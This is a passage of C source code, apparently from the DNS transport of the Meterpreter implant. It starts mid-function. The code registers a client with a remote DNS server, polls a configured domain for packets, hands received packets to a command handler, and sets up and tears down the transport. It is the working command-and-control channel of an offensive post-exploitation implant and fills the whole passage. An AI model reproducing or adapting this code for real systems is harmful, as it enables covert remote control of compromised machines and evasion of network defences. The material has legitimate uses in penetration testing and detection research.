            {
                if (payload)
                {
                    free(payload);
                }
                if (localPacket)
                {
                    free(localPacket);
                }
            }
            
            
        }else if (recieved.status == DNS_INFO_NO_RECORDS) // No data
        {
            
            SetLastError(DNS_INFO_NO_RECORDS);
            res = DNS_INFO_NO_RECORDS;
            
        }else if (recieved.status == ERROR_READ_FAULT){ // ERROR
            
            SetLastError(ERROR_READ_FAULT);
            res = ERROR_READ_FAULT;
            
        } else {
            
            SetLastError(ERROR_READ_FAULT);
            res = ERROR_READ_FAULT;
            
        }
    } else { // Register
        
        vdprintf("[PACKET RECEIVE DNS] sending reg req: %S", ctx->domain);
        BOOL rcvStatus = register_dns(ctx);

        if (rcvStatus == TRUE) // Handle response
        {
            vdprintf("[PACKET RECEIVE DNS] Registred. New CLIENT ID: '%s'", ctx->client_id);
            SetLastError(DNS_INFO_NO_RECORDS);
            res = DNS_INFO_NO_RECORDS;
        } else {
            vdprintf("[PACKET RECEIVE DNS] Registration failed!");
            SetLastError(DNS_INFO_NO_RECORDS);
            res = DNS_INFO_NO_RECORDS;
            
        }
    }
    
    lock_release(remote->lock);

    return res;
}


/*!
 * @brief Initialise the DNS connection (WSAScoket).
 * @param remote Pointer to the remote instance with the DNS transport details wired in.
 * @return Indication of success or failure.
 */
static BOOL server_init_windns(Transport* transport)
{
    DnsTransportContext* ctx = (DnsTransportContext*)transport->ctx;
    //LPWSADATA wsaData;
    PIP4_ARRAY pSrvList = NULL;
    
    dprintf("[WINDNS] Initialising ...");
    
    //wsaData = (LPWSADATA)calloc(1, sizeof(WSADATA));
    
    //if ( (WSAStartup(MAKEWORD(2, 2), wsaData))!= 0) {
    //    dprintf("[WINDNS] WSAStartup failed");
    //    return FALSE;
    //}
    
    
    if (ctx->ns_server!= NULL && wcscmp(ctx->ns_server, L"") != 0){
        char temp[260];
        dprintf("[WINDNS] NS SERVER %S",ctx->ns_server);
        sprintf_s(temp,MAX_PATH,"%S", ctx->ns_server);
        pSrvList = (PIP4_ARRAY)calloc(1, sizeof(IP4_ARRAY));
        DWORD ip;
        inet_pton(AF_INET, temp, (PVOID)&ip);
        pSrvList->AddrArray[0] = ip;
        pSrvList->AddrCount = 1;
        
        ctx->pip4 = (PVOID)pSrvList;
    }


    //ZeroMemory(&ctx->hints, sizeof(&ctx->hints));
    //ctx->hints.ai_family = AF_INET6;
    //ctx->hints.ai_socktype = SOCK_STREAM;
    
    if (ctx->client_id == NULL || ctx->client_id[0] == L'\0' || ctx->client_id[0] == L'0'){
        dprintf("[WINDNS] DNS Ready for reg");
        ctx->ready = FALSE;
    } else {
        dprintf("[WINDNS] DNS already registred with CLIENT_ID %S", ctx->client_id);
        ctx->ready = TRUE;         
    }

    return TRUE;
}

/*!
 * @brief Deinitialise the DNS connection.
 * @param remote Pointer to the remote instance with the DNS transport details wired in.
 * @return Indication of success or failure.
 */
static DWORD server_deinit_dns(Transport* transport)
{
    DnsTransportContext* ctx = (DnsTransportContext*)transport->ctx;

    dprintf("[DNS] Deinitialising ...");

    if (ctx->ready == TRUE)
    {
        ctx->ready = FALSE;
    }

    return TRUE; 
}

/*!
 * @brief The servers main dispatch loop for incoming requests using DNS
 * @param remote Pointer to the remote endpoint for this server connection.
 * @param dispatchThread Pointer to the main dispatch thread.
 * @returns Indication of success or failure.
 */
static DWORD server_dispatch_dns(Remote* remote, THREAD* dispatchThread)
{
    BOOL running = TRUE;
    LONG result = ERROR_SUCCESS;
    Packet* packet = NULL;
    THREAD* cpt = NULL;
    DWORD ecount = 0;
    DWORD delay = 0;
    Transport* transport = remote->transport;
    DnsTransportContext* ctx = (DnsTransportContext*)transport->ctx;

    while (running)
    {
        if (transport->timeouts.comms != 0 && transport->comms_last_packet + transport->timeouts.comms < current_unix_timestamp())
        {
            dprintf("[DISPATCH] Shutting down server due to communication timeout");
            break;
        }

        if (remote->sess_expiry_end != 0 && remote->sess_expiry_end < current_unix_timestamp())
        {
            dprintf("[DISPATCH] Shutting down server due to hardcoded expiration time");
            dprintf("Timestamp: %u  Expiration: %u", current_unix_timestamp(), remote->sess_expiry_end);
            break;
        }

        if (event_poll(dispatchThread->sigterm, 0))
        {
            dprintf("[DISPATCH] server dispatch thread signaled to terminate...");
            break;
        }

        dprintf("[DISPATCH] Reading data from the DNS: %S", ctx->domain);
      
      
        result = packet_receive_dns(remote, &packet);
        
        if (result != ERROR_SUCCESS)
        {
            // Update the timestamp for empty replies
            if (result == DNS_INFO_NO_RECORDS)
            {
                transport->comms_last_packet = current_unix_timestamp();
            }
            delay = 10 * ecount;
            if (ecount >= 10)
            {
                delay *= 10;
            }
            ecount++;
            dprintf("[DISPATCH] no pending packets, sleeping for %dms...", min(10000, delay));
            Sleep(min(10000, delay));
        }
        else
        {
            transport->comms_last_packet = current_unix_timestamp();
            // Reset the empty count when we receive a packet
            ecount = 0;
            dprintf("[DISPATCH] Returned result: %d, %x", result,packet);
            running = command_handle(remote, packet);
            dprintf("[DISPATCH] command_process result: %s", (running ? "continue" : "stop"));
        }
  
    }

    return result;
}

/*!
 * @brief Destroy the DNS transport.
 * @param transport Pointer to the DNS transport to reset.
 */
static void transport_destroy_dns(Transport* transport)
{

    DnsTransportContext* ctx = (DnsTransportContext*)transport->ctx;

    dprintf("[TRANS DNS] Destroying transport for DNS %S", ctx->domain);

    if (ctx)
        {
            if(ctx->domain){
                SAFE_FREE(ctx->domain);
            }
            if(ctx->ns_server){
                SAFE_FREE(ctx->ns_server);
            }
            if(ctx->server_id){
                SAFE_FREE(ctx->server_id);
            }
            if(ctx->pip4){
                SAFE_FREE(ctx->pip4)
            }
            ctx->ready = FALSE;
        }
    SAFE_FREE(transport);

}

void transport_write_dns_config(Transport* transport, MetsrvTransportDns* config)
{
    DnsTransportContext* ctx = (DnsTransportContext*)transport->ctx;

    config->common.comms_timeout = transport->timeouts.comms;
    config->common.retry_total = transport->timeouts.retry_total;
    config->common.retry_wait = transport->timeouts.retry_wait;
    wcsncpy(config->common.url, transport->url, URL_SIZE);
    if (ctx->ns_server)
    {
        wcsncpy(config->ns_server, ctx->ns_server, NS_NAME_SIZE);
    }
    if (ctx->client_id)
    {
        wcsncpy(config->client_id, ctx->client_id, 2);
    }
    if (ctx->server_id)
    {
        wcsncpy(config->server_id, ctx->server_id, 256);
    }
    /*
    if (ctx->domain)
    {
        wcsncpy(config->, ctx->domain, DOMAIN_NAME_SIZE);
    }
    */
    //config->type = ctx->type;
    
}

/*!
 * @brief Create an DNS transport from the given settings.
 * @param config Pointer to the DNS configuration block.
 * @return Pointer to the newly configured/created DNS transport instance.
 */
Transport* transport_create_dns(MetsrvTransportDns* config)
{
    Transport* transport = (Transport*)malloc(sizeof(Transport));
    DnsTransportContext* ctx = (DnsTransportContext*)malloc(sizeof(DnsTransportContext));
    wchar_t *domain;
    
    dprintf("[TRANS DNS] Creating DNS transport for domain %S", config->common.url);

    memset(transport, 0, sizeof(Transport));
    memset(ctx, 0, sizeof(DnsTransportContext));
    
    
    //ctx->create_req = get_request_windns;
    //ctx->send_req = send_request_windns;
    //ctx->close_req = close_request_windns;
    //ctx->validate_response = validate_response_windns;
    //ctx->receive_response = receive_response_windns;
    //ctx->read_response = read_response_windns;

    transport->timeouts.comms = config->common.comms_timeout;
    transport->timeouts.retry_total = config->common.retry_total;
    transport->timeouts.retry_wait = config->common.retry_wait;
    transport->type = METERPRETER_TRANSPORT_DNS;
    
    domain = wcsstr(config->common.url, L"dns://");
    transport->url = _wcsdup(config->common.url);
    
    if (domain == NULL){
        domain = config->common.url;
    }    
    
    ctx->domain = _wcsdup(domain + 6);
    ctx->client_id = _wcsdup(config->client_id);
    ctx->server_id = _wcsdup(config->server_id);
    ctx->ns_server = _wcsdup(config->ns_server);
    //ctx->type = config->type;
    ctx->counter = 0; //TODO: GET COUNTER FROM THE CONFIG
    ctx->pip4 = NULL;
        
    transport->packet_transmit = packet_transmit_via_dns;
    transport->server_dispatch = server_dispatch_dns;
    transport->transport_init = server_init_windns;
    transport->transport_deinit = server_deinit_dns;
    transport->transport_destroy = transport_destroy_dns;
    transport->ctx = ctx;
    transport->comms_last_packet = current_unix_timestamp();

    return transport;
}
